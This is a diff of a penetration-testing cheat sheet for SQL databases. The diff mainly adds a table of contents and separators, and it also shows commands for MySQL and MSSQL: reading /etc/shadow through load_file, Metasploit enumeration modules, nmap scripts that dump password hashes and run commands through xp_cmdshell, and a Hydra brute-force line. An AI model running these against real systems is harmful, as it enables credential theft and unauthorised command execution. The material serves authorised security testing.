@@ -1,5 +1,16 @@
 # SQL
 
+* [mysql](#mysql)
+* [Metasploit](#metasploit)
+* [nmap](#nmap)
+* [Hydra](#hydra)
+* [References](#references)
+
+***********************************************************************
+Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
+Note: Bracket characters themselves [ ] require removal. See examples.
+***********************************************************************
+
 ## mysql
 ```
 mysql -h [IP-ADDRESS] -u [USERNAME]
@@ -25,6 +36,8 @@ select load_file("/etc/shadow");
 ```
 help
 ```
+
+***********************************************************************
 
 ## Metasploit
 
@@ -60,7 +73,10 @@ use auxiliary/scanner/admin/mssql/mssql_enum_sql_exec
 use auxiliary/scanner/admin/mssql/mssql_enum_domain_accounts
 ```
 
+***********************************************************************
+
 ## nmap
+
 ### mysql
 * --script=mysql-empty-password
 * --script=mysql-info
@@ -81,11 +97,14 @@ use auxiliary/scanner/admin/mssql/mssql_enum_domain_accounts
 * --script ms-sql-dump-hashes --script-args mssql.username=[USERNAME],mssql.password=[PASSWORD]
 * --script ms-sql-xp-cmdshell --script-args mssql.username=[USERNAME],mssql.password=[PASSWORD],ms-sql-xp-cmdshell.cmd="[COMMAND-YOU-WANT-TO-RUN]"
 
+***********************************************************************
 
 ## Hydra
 ```
 hydra -l [USERNAME] -P [WORDLIST-PATH] mysql
 ```
+
+***********************************************************************
 
 ### References
 
